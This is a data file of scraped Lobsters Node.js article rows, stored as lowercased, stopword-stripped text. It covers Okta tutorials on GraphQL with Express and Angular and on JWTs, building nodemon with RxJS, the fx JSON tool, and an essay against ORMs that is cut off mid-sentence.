165,Lobsters,nodejs,Node.js programming,"Build a Simple Web App with Express, Angular, and GraphQL",https://developer.okta.com/blog/2018/11/30/web-app-with-express-angular-graphql,build simple web app express angular graphql,build express server using graphql node sqlite download page import data express server implement express server add angular client note create layout routing angular add component angular add access control express angular graphql app create free account application add application single page app clientid secure angular client secure express graphql server learn express angular graphql manual page http githubcomoktadeveloperoktagraphqlangularexample twitter subscribe youtube channel,past year concept rest apis web service become bread butter web developer recently new concept emerged graphql graphql query language invented facebook released public last three year created quite stir regard new revolutionary way creating web apis main difference traditional rest graphql way query sent server rest apis different endpoint type resource response request determined server using graphql typically single endpoint client explicitly state data returned single request graphql contain multiple query underlying model tutorial showing develop simple graphql web application server run using node express client based angular see easy prepare server responding different query remove much work needed compared implementing reststyle apis provide example create service user browse atp tennis player ranking build express server using graphql start implementing server assume node installed system npm command available also using sqlite store data order create database table import data making use command line tool got installed head sqlite download page install package contains commandline shell start create directory contain server code simply called mine server inside directory run next initialize project package needing basic server npm install save express cors expressgraphql graphql import data express server next let create database table import data making use freely available atp tennis ranking jeff sackmann directory system clone github repository git clone http githubcomjeffsackmanntennisatpgit tutorial using two file repository atpplayerscsv atprankingscurrentcsv server directory start sqlite create file tennisdb contain data give command line prompt type sql command let create database table paste run following shell create table player id integer firstname text lastname text hand text birthday integer country text create table ranking date integer rank integer player integer point integer sqlite allows quickly import csv data table simply run following command shell mode csv import pathtotennisdata atpplayerscsv player import pathtotennisdata atprankingscurrentcsv ranking replace pathtotennisdata path downloaded tennis data repository created database contains atp ranked tennis player ever ranking active player current year ready leave implement express server let implement server open new file indexjs main entry point server application start express cors basic const express require express const cors require cors const app express use cors import sqlite open tennis database tennisdb const require const db new tennisdb creates variable db issue sql query obtain result ready dive magic graphql add following code indexjs file const graphqlhttp require expressgraphql const buildschema require graphql const schema buildschema type query player offset int limit int player player id id player ranking rank int ranking type player id id firstname string lastname string hand string birthday int country string type ranking date int rank int player player point int first two line import graphqlhttp buildschema function graphqlhttp plug express able understand respond graphql request buildschema used create graphql schema string let look schema definition little detail two type player ranking reflect content database table used return type graphql query look closely see definition ranking contains player field player type point database integer refers row player table graphql data structure replace integer player refers type query defines query client allowed make example three query player return array player structure list restricted offset limit allow paging table player player query return single player id ranking query return array ranking object given player rank make life little easier create utility function issue sql query return promise resolve query return helpful interface based callback graphql work better promise indexjs add following function function query sql single return new promise resolve reject var callback err result err return reject err resolve result single dbget sql callback else dball sql callback time implement database query power graphql query graphql us something called rootvalue define function corresponding graphql query const root player args return query select player limit argsoffset argslimit false player args return query select player id argsid true ranking args return query select rdate rrank rpoints pid pfirstname plastname phand pbirthday pcountry player p left join ranking r pidrplayer rrank argsrank false row rowsmap result return date resultdate point resultpoints rank resultrank player id resultid firstname resultfirstname lastname resultlastname hand resulthand birthday resultbirthday country resultcountry first two query pretty straightforward consist simple select statement result passed straight back ranking query little complicated left join statement needed combine two database table afterward result cast correct data structure graphql query note query args contains argument passed client need worry way checking missing value assigning default checking correct type done graphql server left create route link graphqlhttp function appuse graphql graphqlhttp schema rootvalue root graphiql true applisten err err return consolelog err return consolelog express app listening port graphiql provides nice user interface test query server start server run open browser navigate http see interactive testbed graphql query add angular client web application without client section walk implementation single page application using angular start create new angular application already done install newest version angular command line tool system npm install g angularcli might run command using sudo depending operating system create new angular application new directory run ng new angulargraphqlclient create new directory install necessary package angular application prompted two question answer yes include routing application style sheet using tutorial simple cs application contain three component associated main app module generate navigating directory created running following three command ng generate component home ng generate component player ng generate component ranking create three directory srcapp add component t code file html template cs stylesheet component order use graphql angular making use apollo library setting apollo angular simple command command install number node module also create angular module file graphqlmodulets srcapp folder import main app module inside file see line const uri add url graphql server change const uri http specifies uri graphql service found note want generate component installing apollo angular need specify module component belongs generating home component would change ng generate component home module app using form module order bind value input element html open srcappappmodulets add import formsmodule angularforms top file add formsmodule import array ngmodule declaration create layout routing angular open srcindexhtml file contains html container angular app live need external cs javascript resource spruce design application add following line inside head tag include minimal material design styling link rel stylesheet href http fontsgoogleapiscomicon familymaterialicons link rel stylesheet href http script defer src http script next open srcappcomponenthtml replace content following div class mdllayout mdljslayout mdllayout fixedheader div class mdllayoutheader mdllayoutheader waterfall div class mdllayoutheaderrow span class mdllayouttitle routerlink class materialicons home angular graphql span add spacer align navigation right desktop div class mdllayoutspacer div navigation ul class mdlnavigation li class mdlnavigationlink routerlink home li li class mdlnavigationlink routerlink player player li li class mdlnavigationlink routerlink ranking ranking li li class mdlnavigationlink ngif isauthenticated click login login li li class mdlnavigationlink ngif isauthenticated click logout logout li ul div div div class mdllayoutdrawer ul class mdlnavigation li class mdlnavigationlink routerlink home li li class mdlnavigationlink routerlink player player li li class mdlnavigationlink routerlink ranking ranking li li class mdlnavigationlink ngif isauthenticated click login login li li class mdlnavigationlink ngif isauthenticated click logout logout li ul div div class mdllayoutcontent content routeroutlet routeroutlet div div creates basic layout topbar link load different component routeroutlet order load make route available application modify approutingmodulets top see declaration route array const route route replace line following import playerscomponent playersplayerscomponent import homecomponent homehomecomponent import rankingcomponent rankingrankingcomponent const route route path component homecomponent path player component playerscomponent path ranking component rankingcomponent router know component place outlet specific route selected point application already show three page link topbar load content area application finally let give page styling appcomponentcss paste following content content padding display flex justifycontent center add component angular ready implement component let start component let user page tennis player database copy following file srcappplayersplayerscomponentts walk meaning part file next import component oninit angularcore import apollo queryref apolloangular import gql graphqltag const playersquery gql query player offset int player offset offset limit id firstname lastname hand birthday country component selector appplayers templateurl playerscomponenthtml styleurls playerscomponentcss export class playerscomponent implement oninit page player private query queryref constructor private apollo apollo ngoninit thisquery thisapollowatchquery query playersquery variable offset thispage thisqueryvaluechangessubscribe result thisplayers resultdata resultdataplayers update thisqueryrefetch offset thispage nextpage thispage thisupdate prevpage thispage thispage thisupdate top three line file contain import needed drive component import component oninit angularcore import apollo queryref apolloangular import gql graphqltag apart core angular import make available apollo queryref apolloangular gql graphqltag latter used straight away create graphql query const playersquery gql query player offset int player offset offset limit id firstname lastname hand birthday country gql tag take template string turn query object query defined ask server return array player populated player field limit parameter cause server return record offset parameter specified parameter query allow paging player component selector appplayers templateurl playerscomponenthtml styleurls playerscomponentcss export class playerscomponent implement oninit page player private query queryref constructor private apollo apollo property playerscomponent specify state component property page store current page list player player contain array player displayed table also query variable store query needed able refetch data whenever user navigates another page constructor inject apollo property access graphql interface ngoninit thisquery thisapollo watchquery query playersquery variable offset thispage thisqueryvaluechangessubscribe result thisplayers resultdata resultdataplayers initialization phase component lifecycle ngoninit method called place player component initiate loading data achieved thisapollowatchquery passing playersquery together value offset parameter subscribe data change using valuechangessubscribe method take callback set player array data obtained server update thisqueryrefetch offset thispage nextpage thispage thisupdate prevpage thispage thispage thisupdate round thing nextpage prevpage increment decrement page property calling refetch query new parameter server request issued data received subscription callback called automatically html template go component stored playerscomponenthtml paste following content table class mdldatatable mdljsdatatable mdldatatable selectable mdlshadow tr th class mdldatatablecell nonnumeric first name th th class mdldatatablecell nonnumeric last name th th class mdldatatablecell nonnumeric hand th th birthday th th class mdldatatablecell nonnumeric country th tr tr ngfor let player player td class mdldatatablecell nonnumeric playerfirstname td td class mdldatatablecell nonnumeric playerlastname td td class mdldatatablecell nonnumeric playerhand td td playerbirthday td td class mdldatatablecell nonnumeric playercountry td tr table div class paging button class mdlbutton mdljsbutton mdlbutton colored click prevpage class materialicons arrowback button page button class mdlbutton mdljsbutton mdlbutton colored click nextpage class materialicons arrowforward button div display list player table table added paging link ranking component pretty much follows pattern srcapprankingcomponentts look like import component oninit angularcore import apollo queryref apolloangular import gql graphqltag const rankingsquery gql query ranking rank int ranking rank rank date rank point player firstname lastname component selector appranking templateurl rankingcomponenthtml styleurls rankingcomponentcss export class rankingcomponent implement oninit rank number ranking private query queryref constructor private apollo apollo ngoninit thisquery thisapollowatchquery query rankingsquery variable rank mathround thisrank thisqueryvaluechangessubscribe result thisrankings resultdata resultdatarankings update return thisqueryrefetch rank mathround thisrank see code similar playerscomponentts definition rankingsquery query player time held particular rank note query requesting firstname lastname player mean server sending additional player data back client asked template ranking component contains text field button user enter rank reload page table player content rankingcomponenthtml ranking input class mdltextfieldinput type text id rank ngmodel rank button class mdlbutton mdljsbutton mdlbutton raised mdljsrippleeffect click update update button table class mdldatatable mdljsdatatable mdlshadow ngif ranking tr th rank th th date th th point th th class mdldatatablecell nonnumeric first name th th class mdldatatablecell nonnumeric last name th tr tr ngfor let ranking ranking td rankingrank td td rankingdate td td rankingpoints td td class mdldatatablecell nonnumeric rankingplayerfirstname td td class mdldatatablecell nonnumeric rankingplayerlastname td tr table start client run make sure server also running client successfully request data add access control express angular graphql app one important feature every web application user authentication access control section guide step needed add authentication server client part angular application often daunting part writing application using okta greatly simplifies task make secure authentication available every developer already done create developer account okta visit http developeroktacom select create free account fill form register registration complete see developer dashboard top menu dashboard select application add application clicking green add application button see choice different type application registering single page app next page see setting application port number prefilled angular us port default change port number completed given clientid need client server application also need okta developer domain url see top page logged okta developer dashboard secure angular client order use okta authentication angular client install oktaangular library base directory client application run following command npm install oktaoktaangular apollolinkcontext save open srcappappmodulets top file add import statement import oktaauthmodule oktaoktaangular add module list import app module oktaauthmoduleinitauth issuer http youroktadomain redirecturi http clientid yourclientid need replace youroktadomain development domain see browser navigate okta dashboard also replace yourclientid client id obtained registering application ready use okta authentication throughout application next implement logging logging application open appcomponentts import oktaauthservice oktaangular paste following code file import component oninit angularcore import router angularrouter import oktaauthservice oktaoktaangular component selector approot templateurl appcomponenthtml styleurls appcomponentcss export class appcomponent implement oninit public title angular app public isauthenticated boolean constructor public oktaauth oktaauthservice thisoktaauth authenticationstatesubscribe isauthenticated boolean thisisauthenticated isauthenticated async ngoninit thisisauthenticated await thisoktaauthisauthenticated login thisoktaauthloginredirect logout thisoktaauthlogout oktaauthservice service injected constructor used set isauthenticated flag subscribe method subscribes callback function triggered whenever login status change isauthenticated initialized ngoninit phase reflect login status application first loaded login logout handle process logging order make authentication work oktaangular us special route called implicitcallback file approutingmodulets add following import import oktacallbackcomponent oktaauthguard oktaoktaangular implicitcallback route linked oktacallbackcomponent adding following route array path implicitcallback component oktacallbackcomponent needed log application protected yet route want accesscontrol add authorization guard luckily easy route want protect add canactivate property add following player ranking route canactivate oktaauthguard user try access player view redirected okta login page logged user redirected back product view secured client page move securing back end let take moment think server authenticate user okta us bearer token identifies user bearer token must sent server every request achieve client make sure bearer token added http header need add line code graphqlmodulets top file import following import oktaauthservice oktaoktaangular import setcontext apollolinkcontext modify createapollo function add bearer token export function createapollo httplink httplink oktaauth oktaauthservice const http httplinkcreate uri const auth setcontext header return oktaauthgetaccesstoken token return token header authorization bearer token return link authconcat http cache new inmemorycache secure express graphql server securing server done adding express middleware function server application need additional library change server directory run command npm install oktajwtverifier bodyparser expressbearertoken next let create function separate file called authjs root folder server const oktajwtverifier require oktajwtverifier const oktajwtverifier new oktajwtverifier clientid yourclientid issuer http youroktadomain moduleexports async function oktaauth req re next try const token reqtoken token return resstatus send authorized const jwt await oktajwtverifierverifyaccesstoken token requser uid jwtclaimsuid email jwtclaimssub next catch err return resstatus send errmessage replace youroktadomain yourclientid development domain client id purpose function simple check presence token field request present oktajwtverifier check validity token everything order calling next signal success otherwise error returned make sure function used application add following require statement indexjs file const bodyparser require bodyparser const bearertoken require expressbearertoken const oktaauth require auth modify declaration app following way const app express use cors use bodyparserjson use bearertoken use oktaauth bearertoken middleware look bearer token add request oktaauth find simple addition server allow request provide valid authentication learn express angular graphql simple tutorial shown create single page application angular using graphql user authentication implemented minimal effort using okta service talked use graphql add modify data database graphql language called mutation learn mutation using apollo check manual page complete code project found http githubcomoktadeveloperoktagraphqlangularexample interested learning express angular graphql secure user management encourage check resource like learned today love follow u twitter subscribe youtube channel
166,Lobsters,nodejs,Node.js programming,Backdoor in popular event-stream NPM repo,https://github.com/dominictarr/event-stream/issues/116,backdoor popular eventstream npm repo,join github today sign,dismiss join github today github home million developer working together host review code manage project build software together sign
167,Lobsters,nodejs,Node.js programming,Create and Verify JWTs with Node,https://developer.okta.com/blog/2018/11/13/create-and-verify-jwts-with-node,create verify jwts node,trust jwts use jwt quite build simple node app create json web token node app header payload signature header payload signature verify json web token node app add oidc middleware node app handle jwt functionality auth okta sign foreverfree developer account create okta server application add application web next base uri login redirect uri done edit logout redirect uri save learn node jwts secure user management oktadev facebook youtube channel,authentication internet evolved quite bit year many way worked well enough quite cut today tutorial briefly cover older simpler form authentication show modern secure approach end post able create verify jwts node also show leverage okta behind scene traditionally simplest way authorization username password called basic authorization done sending username password encoded string decoded anybody looking could think string token problem sending password every request could also send username password single time let server create session id client would send id along every request instead username password method work well hassle client store maintain session especially large set user third method managing authorization via json web token jwts jwts become de facto standard last year jwt make set claim eg abe froman sausage king chicago verified like basic authorization claim read anybody unlike basic auth however sharing password anyone listening instead trust trust jwts ok maybe believe everything read internet might wondering someone make claim expect server believe make claim using jwt signed server secret key server reading key easily verify claim valid even without knowing secret used however would nearly impossible someone modify claim make sure signature valid without access secret key use jwt using jwt allows server offload authentication party trust long trust party let ensure user say party create jwt passed server whatever information necessary typically includes least user user id standardly referred sub subject issuer i token expiration time exp quite standardized claim really put json want claim remember info include longer token build simple node app create verify jwts first need set node server well teaching today get started run following command set new project mkdir funwithjwts cd funwithjwts npm init npm install express npm install nodemon next create new file indexjs contain super simple node server three endpoint stubbed todos note implement create endpoint require basic authorization log writing real oauth server would probably use something basic auth would also need look user database make sure provided right password keep thing simple demo hardcoded single username password focus jwt functionality verify endpoint take jwt parameter decoded const express require express const app express const port processenvport appget create req re reqheadersauthorization basic resset wwwauthenticate basic realm resstatus send try user azurediamond password return ressend todo create jwt appget verify token req re ressend todo verify jwt reqparamstoken appget req re ressend todo use okta auth applisten port consolelog jwt server listening port port run server typing nodemodulesbinnodemon start server port restart automatically make change source code access going http browser hit different endpoint need change url http http prefer work command line use curl hit endpoint curl todo use okta auth curl try user azurediamond password curl azurediamond todo create jwt curl todo verify jwt asdf create json web token node app json web token three part header payload signature separated header encoded json object specifying algorithm use type token payload also encoded json object containing pretty much anything want typically least contain expiration timestamp identifying information signature hash header payload secret key together using algorithm specified header number tool create jwts various language node one simple one njwt add project run replace ressend todo create jwt line indexjs following const jwt require njwt const claim i funwithjwts sub azurediamond const token jwtcreate claim topsecretphrase tokensetexpiration new date gettime ressend tokencompact feel free mess around payload setexpiration function token expire one minute let see happens expires without wait long test get token log via create endpoint go browser http use curl curl azurediamond verify json web token node app well look bit like gibberish see two jwt separating header payload signature human readable next step write something decode string something make little legible replace line containing todo verify jwt following const jwt require njwt const token reqparams jwtverify token topsecretphrase err verifiedjwt err ressend errmessage else ressend verifiedjwt route verify token token part tell express want read section url param get reqparamstoken use njwt try verify token fails could mean number thing like token malformed expired back website curl create another token using http copy paste url http get something like following header typ jwt alg body i funwithjwts sub azurediamond jti iat exp wait minute try instead get jwt expired add oidc middleware node app handle jwt functionality well bad sure glossed lot detail topsecretphrase really top secret make sure secure one easy find jwt option actually store browser optimal expiration time token okta come play rather dealing leverage okta cloud service handle couple minute setup stop thinking make app secure focus make unique auth okta okta cloud service allows developer create edit securely store user account user account data connect one multiple application api enables already one sign foreverfree developer account create okta server going need save information use app create new file named env enter okta organization url hosturlhttp oktaorgurlhttps youroktaorgurl also need random string use app secret session generate following command npm install g uuidcli echo appsecret uuid env next log developer console navigate application click add application select web click next give application name like fun jwts change base uri http login redirect uri http click done click edit add logout redirect uri http click save page come creating application information need save env file copy client id client secret oktaclientid yourclientid oktaclientsecret yourclientsecret back code need add okta oidc middleware control authentication also relies using session need use dotenv read variable env file install dependency need run command npm install oktaoidcmiddleware dotenv expresssession top indexjs file need include dotenv make secret env file read program add line anything else require dotenv config get okta set securely need tell express use okta oidc middleware also requires session look line containing todo use okta auth indexjs file enter following initialize okta environment variable const session require expresssession const expressoidc require oktaoidcmiddleware appuse session secret processenvappsecret resave true saveuninitialized false const oidc new expressoidc issuer processenvoktaorgurl clientid processenvoktaclientid clientsecret processenvoktaclientsecret redirecturi processenvhosturl authorizationcodecallback scope openid profile appuse oidcrouter set creating secure route breeze test replace remaining todo use okta auth line route like appget oidcensureauthenticated req re ressend peekaboo go http redirected secure signin page since probably still logged okta admin panel may need use different browser incognito window see login screen visitor site would sign get hidden message learn node jwts secure user management certainly lot meaningful thing printing peekaboo key takeaway quick setup add authentication route express server adding simple oidcensureauthenticated okta take care managing user storing session creating verifying jwts like learn jwts node check post okta developer blog question post please add comment awesome content follow oktadev twitter like u facebook subscribe youtube channel
168,Lobsters,nodejs,Node.js programming,Creating Nodemon in Node.js,https://blog.logrocket.com/creating-nodemon-in-node-js-70b295c2610c,creating nodemon nodejs,brilliant developer nodemon architecture pull request known bug chokidar core rxjs http reactivexiorxjsmanualoverviewhtml http rxjsdevfirebaseappcomguideoverview command line usage formatting repository implementation getting parsing argument listening change cheat sheet getting information file watching needed file delaying execution displaying message executing provided script summary reactive extension api monitor failed slow network request production try logrocket http logrocketcomsignup logrocket start monitoring free,manually restarting application process change codebase exhausting frustrating fortunately one brilliant developer eventually said enough decided put end madness simple package nodemon nodemon watch change occurring inside given directory restarts app one letting u focus solely writing code using something like nodemon great way deepen understanding file system work appreciation nodejs environment general architecture first came across nodemon help wonder possible get notification change file system set interval recursively check file given directory would take lot resource result actually slow work instead pooled existing file checked periodically would know new file created fair guess nodemon work somewhat differently check nodejs documentation see api watching file called fswatcher filesystemwatcher let u set callback executed directory file changed start celebrating possibility present let look problem make working api troublesome see changing file sometimes notify u twice quite nuisance happens way operating system designed turn mean treat like regular bug nodejs fix simply sending pull request example window notepad performs multiple file system action writing process notepad writes disk batch create content file file attribute application may work similar manner filesystemwatcher monitor operating system activity event application fire picked prevent repeated notification well known bug going use package called chokidar improvement fix package provides watching file system finally start considering library going use application core chosen rxjs core library make working eventbased architecture easy manage thanks observables stream longer find callback hell calling function function inside event handler working rxjs revolves around call reactive programming whole idea based operation made stream created observable think observable kind promise return multiple value time event occurs new value passed stream resulting every function inside pipe method called value argument may feel strange first write code adherence reactive programming paradigm even simplest task may seem overly complicated become another way programming fun one ever come contact angular http client us rxjs going seem familiar otherwise tried angular yet might good idea get thorough grasp fundamental rxjs make learning angular much quicker future get firm understanding basic rxjs recommend reading http reactivexiorxjsmanualoverviewhtml http rxjsdevfirebaseappcomguideoverview command line usage would like app accessible like command console original nodemon npm run start e t j html w src build x l l course later releasing package npm run start going replaced name package example ournodemon formatting going throw color fun go ahead copy repository let get started implementation getting parsing argument every time execute script pas argument argument passed process found variable called processargv move see actual implementation let consider exactly would like user pas app argument mind extension watch directory watch directory ignore delay restart millisecond script restarted time note argument required since every option set default parse argument many way easiest one use commander commander par argument give u ability declare neat way like list const commandarguments program version option e ext item extension watch parserslist option w watch item directory watch parserslist option ignore item directory ignore parserslist option delay n delay execution parsersint option x exe script execute script restart parse processargv see method parser object commander need order change argument passed string format expect const parser int number string parseint number float number string parsefloat number list val string valsplit collect val memo memopush val return memo argument passed app execution variable everything seems fine would also like default argument error thrown whenever argument missing ensure aforementioned requirement met simple function called parsearguments const parsearguments execution programcommand const ext watch ignore delay exe execution exe throw new error script provided return delay extension extmap e e watcheddirectories watch ignoreddirectories ignore nodemodules build shouldwatcheverydirectory watchlength shouldwatcheveryextension extlength script exe listening change chokidar easy listen change simply set listener change event like fromevent chokidarwatch processcwd pipe note used dirname want watch file inside directory application executed nodemon code resides also see first use rxjs observable fromevent function allows u listen change event every time listener executed value sent stream pipe stream set function example change map reject filter value since lot useful cheat sheet getting information file chokidar event provide u following information name event path changed file really interested name event sure care path file received path file check file cause restart script however one problem still namely path following format userswowrepositoriesawesomeappserviceblablaindexts want look like serviceblablaindexts worry previously used processcwd give u path userswowrepositoriesawesomeapp remove duplicated part chokidar path receive relative path application directory fromevent chokidarwatch processcwd pipe map event filepath string const filename pathbasename filepath const extension pathextname filename return event filename extension filepath filepathslice processcwd length path relative application directory make easy filter change ignored file watching needed file providing argument user specify directory interested example watch src asset mean ignore change made outside directory src asset note possible still ignore specific subdirectory comparison let u set directory would like ignored going default add nodemodules build directory provided user since would always like ignored const isindirectory directory string filepath string directoriessome filepathstartswithbind filepath const isexpectedextension extension string extension string extensionssome extension const shouldpathbeignored isindirectory ignoreddirectories const shouldpathbewatched isindirectory watcheddirectories const shouldextensionbewatched isexpectedextension extension fromevent chokidarwatch processcwd pipe filter filepath extension shouldwatcheverydirectory shouldpathbewatched filepath shouldwatcheveryextension shouldextensionbewatched extension shouldpathbeignored filepath rule file accepted could laid like watch every directory check directory watched watch every extension check extension watched path ignored negate result get false filter return false value go stream discarded sure working file interested delaying execution sometimes saving file one one may cause many restarts script turn may use lot processing power wait second last change event emitted script restarts technique keep delaying given action called debouncing fromevent chokidarwatch processcwd pipe debouncetime delay debounce function actually placed first function pipe going anything percent sure displaying message execute script would nice color message throw emojis going need little helper const message content string color string const msg emojiemojify content color color return color color msg return msg executing provided script nodejs enables u execute command using childprocess module namely spawn function spawning provided script need keep reference instance kill spawn time change file keeping eye const createscriptexec script string let instance null return async function execute instance await kill instance sigkill instance spawn script shell true return merge string string fromevent instancestderr data pipe map data message datatostring red fromevent instancestdout data pipe map data message datatostring cyan pipe takeuntil fromevent instance close const executescript createscriptexec script fromevent chokidarwatch processcwd pipe switchmap executescript tap consolelog message executing green switchmap obsvr return obsvrpipe tap consolelog reduce null tap consolelog message finished fire green result calling executescript get observable stream log executed script log script stdout logged cyan use red log application error stderr green log created application way clear log came line use switchmap get observable mentioned pipe log return tap consolelog log everything console reduce null wait observable completed move observable finish log user script executed summary congratulation used whole new way programming build application great thing reactive extension api available javascript rxjs ubiquity make knowledge hopefully gained easily applicable programming language monitor failed slow network request production deploying nodebased web app website easy part making sure node instance continues serve resource app thing get tougher interested ensuring request backend third party service successful try logrocket http logrocketcomsignuplogrocket like dvr web apps recording literally everything happens site instead guessing problem happen aggregate report problematic network request quickly understand root cause logrocket instrument app record baseline performance timing page load time time first byte slow network request also log redux ngrx vuex actionsstate start monitoring free
169,Lobsters,nodejs,Node.js programming,Interactive terminal tool for JSON,https://github.com/antonmedv/fx,interactive terminal tool json,feature install release usage interactive mode fxrc documentation documentation link related license mit,function execution commandline json processing tool feature easy use standalone binary interactive mode streaming support install via homebrew download standalone binary release bash curl l http fxwtf usage start interactive mode without passing argument passing filename first argument pas json file cat foojson barjson bazjson fx message use full power javascript curl fx filter x xstartswith access lodash ramda etc method using fxrc file curl fx groupby commitcommittername mapvalues size update json using spread operator echo count fx count count print formatted json stdout pipe json log stream fx kubectl log f fx message try documentation see full documentation link related license mit
170,Lobsters,nodejs,Node.js programming,Why you should avoid ORMs (with examples in Node.js),https://blog.logrocket.com/why-you-should-avoid-orms-with-examples-in-node-js-e0baab73fa5,avoid orms example nodejs,http martinfowlercomblikiormhatehtml follow along layer abstraction low level database driver mysql pg middle level query builder knex high level orm sequelize bookshelf waterline objection sequelize reason learning wrong thing sequelize bookshelf waterline objection reason complex orm call inefficient handwritten pg driver generated knex query builder generated sequelize orm reason orm everything query builder sweet spot monitor failed slow network request production try logrocket http logrocketcomsignup logrocket start monitoring free,image credit http martinfowlercomblikiormhatehtml post consider several reason avoid using orm object relational mapping project concept discussed post applicable every language platform code example written nodejsflavored javascript considering package obtained npm repository first foremost intend dis module mentioned post lot hard work gone every one used production application around world merrily respond plenty request every day also deployed application using orms regret nothing follow along orms powerful tool orms examining post able communicate sql backends sqlite postgresql mysql mssql example post make use postgresql powerful open source sql server orms capable communicating nosql backends mongoose orm backed mongodb considering post first run following command start instance postgresql locally configured way request made default postgresql port forwarded container also write file disk home directory subsequent instantiation retain data already created mkdir p datapgnodeorms docker run name pgnodeorms p e e postgresuserormuser e postgresdbormdb v datapgnodeorms varlibpostgresqldata postgres got database running need add table data database allow u query data get better understanding various layer abstraction run next command start interactive postgresql prompt docker run rm link pgnodeorms postgres postgres psql h postgres u ormuser ormdb prompt type password previous code block connected copy paste following query prompt press enter create type itemtype enum meat veg spice dairy oil create table item id serial primary key name varchar null type itemtype create index item type insert item value chicken meat garlic veg ginger veg garam masala spice turmeric spice cumin spice ground chili spice onion veg coriander spice tomato veg cream dairy paneer dairy pea veg ghee oil cinnamon spice create table dish id serial primary key name varchar null veg boolean null create index dish veg insert dish value chicken tikka masala false matar paneer true create table ingredient dishid integer null reference dish id itemid integer null reference item id quantity float default unit varchar null insert ingredient value whole breast tbsp tbsp tsp tsp tsp tsp whole tsp whole cup clove inch piece cup tsp tsp tsp tsp tbsp tbsp whole whole inch stick populated database type quit disconnect psql client get control terminal back ever want run raw sql command run docker run command finally also need create file named connectionjson containing following json structure used node application later connect database host localhost port database ormdb user ormuser password layer abstraction diving much code let clarify different layer abstraction like everything computer science tradeoff add layer abstraction added layer abstraction attempt trade decrease performance increase developer productivity though always case low level database driver basically lowlevel get short manually generating tcp packet delivering database database driver going handle connecting database sometimes connection pooling level going writing raw sql string delivering database receiving response database nodejs ecosystem many library operating layer three popular library mysql mysql star weekly downloads pg postgresql star weekly downloads sqlite star weekly downloads library essentially work way take database credential instantiate new database instance connect database send query form string asynchronously handle result simple example using pg module get list ingredient required cook chicken tikka masala usrbinenv node npm install pg const client require pg const connection require connectionjson const client new client connection clientconnect const query select ingredient itemname itemname itemtype itemtype ingredient left join item itemid ingredientitemid ingredientdishid client query query re consolelog ingredient let row resrows consolelog rowitemname rowquantity rowunit clientend middle level query builder intermediary level using simpler database driver module v fullfledged orm notable module operates layer knex module able generate query different sql dialect module depends one aforementioned library need install particular one plan using knex knex query builder star weekly downloads creating knex instance provide connection detail along dialect plan using able start making query query write closely resemble underlying sql query one nicety able programmatically generate dynamic query much convenient way concatenate string together form sql often introduces security vulnerability simple example using knex module get list ingredient required cook chicken tikka masala usrbinenv node npm install pg knex const knex require knex const connection require connectionjson const client knex client pg connection client select clientref itemname itemname clientref itemtype itemtype ingredient leftjoin item itemid ingredientitemid dishid debug row consolelog ingredient let row row consolelog rowitemname rowquantity rowunit clientdestroy high level orm highest level abstraction going consider working orms typically need lot configuration ahead time point orm name implies map record relational database object typically always class instance application mean defining structure object well relationship application code sequelize star weekly downloads bookshelf knex based star weekly downloads waterline star weekly downloads objection knex based star weekly downloads example going look popular orms sequelize also going model relationship represented original postgresql schema using sequelize example using sequelize module get list ingredient required cook chicken tikka masala usrbinenv node npm install sequelize pg const sequelize require sequelize const connection require connectionjson const disablesequelizedefaults timestamps false freezetablename true const datatypes sequelize const sequelize new sequelize database connectiondatabase username connectionuser host connectionhost port connectionport password connectionpassword dialect postgres operatorsaliases false const dish sequelizedefine dish id type datatypesinteger primarykey true autoincrement true name type datatypesstring veg type datatypesboolean disablesequelizedefaults const item sequelizedefine item id type datatypesinteger primarykey true autoincrement true name type datatypesstring type type datatypesstring disablesequelizedefaults const ingredient sequelizedefine ingredient dishid type datatypesinteger primarykey true itemid type datatypesinteger primarykey true quantity type datatypesfloat unit type datatypesstring disablesequelizedefaults itembelongstomany dish ingredient foreignkey itemid dishbelongstomany item ingredient foreignkey dishid dishfindone id include model item row consolelog ingredient let row rowsitems consolelog rowdatavaluesname rowingredientdatavaluesquantity rowingredientdatavaluesunit sequelizeclose seen example perform similar query using different abstraction layer let dive reason wary using orm reason learning wrong thing lot people pick orm want take time learn underlying sql structured query language belief often sql hard learn learning orm simply write application using single language instead two first glance seems hold orm going written language rest application sql completely different syntax problem line thinking however problem orms represent complex library get hand surface area orm large learning inside easy task learned particular orm knowledge likely transfer well true switch one platform another jsnodejs c net perhaps even le obvious true switch one orm another within platform sequelize bookshelf nodejs consider following orm example generate list recipe item vegetarian sequelize usrbinenv node npm install sequelize pg const sequelize require sequelize const op datatypes sequelize const connection require connectionjson const disablesequelizedefaults timestamps false freezetablename true const sequelize new sequelize database connectiondatabase username connectionuser host connectionhost port connectionport password connectionpassword dialect postgres operatorsaliases false const item sequelizedefine item id type datatypesinteger primarykey true autoincrement true name type datatypesstring type type datatypesstring disablesequelizedefaults select id name type item item item type veg item findall type veg row consolelog veggie let row row consolelog rowdatavaluesid rowdatavaluesname sequelizeclose bookshelf usrbinenv node npm install bookshelf knex pg const connection require connectionjson const knex require knex client pg connection debug true const bookshelf require bookshelf knex const item bookshelfmodelextend tablename item select item item type item type veg fetchall result consolelog veggie let row resultmodels consolelog rowattributesid rowattributesname knexdestroy waterline usrbinenv node npm install sailspostgresql waterline const pgadapter require sailspostgresql const waterline require waterline const waterline new waterline const connection require connectionjson const itemcollection waterlinecollectionextend identity item datastore default primarykey id attribute id type number automigrations autoincrement true name type string required true type type string required true waterlineregistermodel itemcollection const config adapter pg pgadapter datastores default adapter pg host connectionhost port connectionport database connectiondatabase user connectionuser password connectionpassword waterlineinitialize config err ontology const item ontologycollectionsitem select id name type public item type limit item find type veg row consolelog veggie let row row consolelog rowid rowname waterlinestop waterline objection usrbinenv node npm install knex objection pg const connection require connectionjson const knex require knex client pg connection debug true const model require objection modelknex knex class item extends model static get tablename return item select item item type item query type veg row let row row consolelog rowid rowname knexdestroy syntax simple read operation varies greatly example operation trying perform increase complexity operation involving multiple table orm syntax vary implementation even least dozen orms nodejs alone least hundred orms platform learning tool would nightmare lucky u really sql dialect worry learning generate query using raw sql easily transfer knowledge different platform reason complex orm call inefficient recall purpose orm take underlying data stored database map object interact within application often come inefficiency use orm fetch certain data consider example query first looked section layer abstraction query simply wanted list ingredient quantity particular recipe first made query writing sql hand next made query using query builder knex finally made query using orm sequelize let take look query generated three command handwritten pg driver first query exactly one wrote hand represents succinct method get exactly data want select ingredient itemname itemname itemtype itemtype ingredient left join item itemid ingredientitemid ingredientdishid prefix query explain send postgresql server get cost operation generated knex query builder next query mostly generated u due explicit nature knex query builder pretty good expectation output look like select item name itemname item type itemtype ingredient left join item item id ingredient itemid dishid newlines added readability minor 